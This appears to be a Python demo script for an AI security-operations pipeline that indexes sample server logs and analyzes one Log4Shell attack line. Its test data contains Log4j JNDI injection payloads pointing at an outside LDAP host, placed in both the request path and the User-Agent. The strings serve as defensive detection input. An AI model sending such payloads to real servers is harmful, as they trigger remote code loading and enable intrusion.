from vectorstore.faiss_store import FAISSStore
from ingestion.metadata import MetadataExtractor
from pipeline import AISOCPipeline


def print_section(title):
    print("\n" + "=" * 70)
    print(title)
    print("=" * 70)


def main():

    # -------------------------------------------------
    # Create / Load Vector Store
    # -------------------------------------------------

    store = FAISSStore()

    store.load()

    if store.count() == 0:

        extractor = MetadataExtractor()

        logs = [

            "GET /${jndi:ldap://185.220.101.33/a} HTTP/1.1 Apache/2.4.51",

            "GET /index.jsp HTTP/1.1 200 from 192.168.10.5",

            "POST /login HTTP/1.1 401 from 203.0.113.11",

            "Failed password for root from 203.0.113.45 port 22 ssh2",

        ]

        for log in logs:

            store.add_document(
                log,
                extractor.extract_metadata(log)
            )

        store.save()

    # -------------------------------------------------
    # Create Pipeline
    # -------------------------------------------------

    pipeline = AISOCPipeline(store)

    # -------------------------------------------------
    # Test Log — Log4Shell Exploitation (CVE-2021-44228)
    # -------------------------------------------------

    log = (
        "Jul 22 03:17:09 appserver tomcat[8080]: "
        "GET /${jndi:ldap://185.220.101.33:1389/Exploit} HTTP/1.1 "
        "User-Agent: ${jndi:ldap://185.220.101.33:1389/Exploit} "
        "from 185.220.101.33 port 44382 "
        "Log4j 2.14.1 Apache/2.4.51"
    )

    # -------------------------------------------------
    # Analyze
    # -------------------------------------------------

    context = pipeline.analyze(log)

    # -------------------------------------------------
    # Metadata
    # -------------------------------------------------

    print_section("Metadata")

    print(context.metadata)

    # -------------------------------------------------
    # IOC
    # -------------------------------------------------

    print_section("IOC")

    print(context.ioc)

    # -------------------------------------------------
    # Software
    # -------------------------------------------------

    print_section("Software")

    print(context.software)

    # -------------------------------------------------
    # Retrieved Logs
    # -------------------------------------------------

    print_section("Retrieved Logs")

    for result in context.similar_logs:

        print(f"Similarity: {result.similarity:.3f}")
        print(result.document.log)
        print()

    # -------------------------------------------------
    # Threat Intelligence
    # -------------------------------------------------

    print_section("Threat Intelligence")

    print(context.threat_intel)

    # -------------------------------------------------
    # Risk
    # -------------------------------------------------

    print_section("Risk")

    print(context.risk)

    # -------------------------------------------------
    # Confidence
    # -------------------------------------------------

    print_section("Confidence")

    print(context.confidence)

    # -------------------------------------------------
    # Incident Report
    # -------------------------------------------------

    print_section("Incident Report")

    print(context.incident_report)


if __name__ == "__main__":
    main()
